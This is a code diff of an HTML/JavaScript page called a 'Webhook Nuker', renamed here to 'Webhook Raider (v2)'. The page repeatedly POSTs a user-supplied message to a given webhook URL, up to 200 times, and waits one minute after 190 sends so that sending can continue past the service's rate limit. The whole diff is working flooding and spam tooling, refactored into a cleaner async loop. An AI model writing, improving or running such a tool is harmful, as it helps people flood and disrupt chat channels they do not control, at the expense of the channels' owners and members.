@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <style>
     body {
       background-color: #1e1e2f;
@@ -78,7 +78,6 @@
       color: #fff;
     }
 
-    /* Footer Link */
     .footer-link {
       position: absolute;
       bottom: 10px;
@@ -100,7 +99,7 @@
 </head>
 <body>
   <div class="container">
-    <div class="header">Penguin Webhook Nuker</div>
+    <div class="header">Penguin Webhook Raider (v2)</div>
     <label for="webhook-url">Webhook URL</label>
     <input type="text" id="webhook-url" class="input-field" />
 
@@ -121,73 +120,68 @@
   </div>
 
   <script>
-    let messageQueue = [];
     let messagesSent = 0;
+    let totalMessages = 0;
     const rateLimitThreshold = 190; // Send until 190 messages, then wait
     const cooldownTime = 60000; // 1 minute cooldown
     const delay = 1000; // Delay between each message in ms (1 second)
 
-    function sendMessage() {
+    async function sendMessage() {
       const webhookUrl = document.getElementById("webhook-url").value;
       const message = document.getElementById("message").value;
-      const numberOfTimesToSend = parseInt(document.getElementById("message-count").value);
+      let numberOfTimesToSend = parseInt(document.getElementById("message-count").value);
 
-      if (webhookUrl && message && numberOfTimesToSend > 0 && numberOfTimesToSend <= 200) {
-        messageQueue = Array(numberOfTimesToSend).fill({ webhookUrl, message });
-        messagesSent = 0;
-        updateStatus();
-        sendMessages();
-      } else {
-        console.error("Please provide valid inputs.");
+      // Validate input
+      if (!webhookUrl || !message || numberOfTimesToSend <= 0 || numberOfTimesToSend > 200) {
+        alert("Please enter a valid webhook URL, message, and number of times to send (1-200).");
+        return;
       }
-    }
 
-    function sendMessages() {
-      if (messageQueue.length > 0) {
-        const { webhookUrl, message } = messageQueue.shift();
-        sendMessageToWebhook(webhookUrl, message);
-      } else {
-        console.log("All messages sent!");
-      }
-    }
+      // Reset message sending process
+      messagesSent = 0;
+      totalMessages = numberOfTimesToSend;
+      updateStatus();
 
-    function sendMessageToWebhook(webhookUrl, message) {
-      fetch(webhookUrl, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ content: message })
-      })
-      .then(response => {
-        if (response.ok) {
-          messagesSent++;
-          updateStatus();
-
-          if (messagesSent >= rateLimitThreshold) {
-            setTimeout(resumeSending, cooldownTime);
-            return;
-          }
-
-          if (messageQueue.length > 0) {
-            setTimeout(sendMessages, delay);
-          }
-        } else if (response.status === 429) {
-          const retryAfter = response.headers.get('Retry-After') * 1000 || cooldownTime;
-          setTimeout(resumeSending, retryAfter);
-        } else {
-          console.error("Failed to send message.");
+      // Send messages
+      for (let i = 0; i < numberOfTimesToSend; i++) {
+        // If rate limit threshold reached, wait before sending more
+        if (messagesSent >= rateLimitThreshold) {
+          await waitForCooldown();
         }
-      })
-      .catch(error => {
-        console.error("Error:", error);
+        await sendSingleMessage(webhookUrl, message);
+        messagesSent++;
+        updateStatus();
+      }
+
+      console.log("All messages sent successfully!");
+    }
+
+    async function sendSingleMessage(webhookUrl, message) {
+      try {
+        const response = await fetch(webhookUrl, {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json",
+          },
+          body: JSON.stringify({ content: message }),
+        });
+
+        if (!response.ok) {
+          throw new Error("Failed to send message.");
+        }
+      } catch (error) {
+        console.error("Error sending message:", error);
+      }
+    }
+
+    function waitForCooldown() {
+      return new Promise(resolve => {
+        console.log("Rate limit reached, waiting for cooldown...");
+        setTimeout(resolve, cooldownTime);
       });
     }
 
-    function resumeSending() {
-      sendMessages();
-    }
-
     function updateStatus() {
-      const totalMessages = messageQueue.length + messagesSent;
       document.getElementById("message-status").textContent = `Messages Sent: (${messagesSent}/${totalMessages})`;
     }
   </script>
